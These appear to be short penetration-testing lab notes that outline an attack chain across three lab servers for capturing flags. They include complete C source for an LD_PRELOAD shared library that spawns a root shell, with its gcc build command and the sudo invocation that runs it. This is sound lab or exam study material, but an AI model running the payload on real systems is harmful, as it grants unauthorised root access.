Pretty straight forward exploit for server1
After exploiting server1, use post exploitation modules to gather information. You can do manually or use scripts like Linpeas, linenum
Check all user directories
Make sure if the user exist or its just a normal directory.
From a bash history file in one of the user directory we find the mysql credentials of the server2. (But there isnt much in server2 mysql database)
If there are only default databases in mysql server, go with mysql UDF exploit in metasploit.(Check this lab solution for exploit options)
Exploiting server 3 is straight forward.
After getting reverse shel, we can find flag1
Escalate privilege to read the other 2 flags.
Refer the manual enumeration method used in this box. Might help during the exam

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}



gcc -fPIC -shared -o shell.so shell.c -nostartfiles
file shell.so


id
sudo LD_PRELOAD=/home/robert/shell.so ls
id
Refer internet for this exploit.
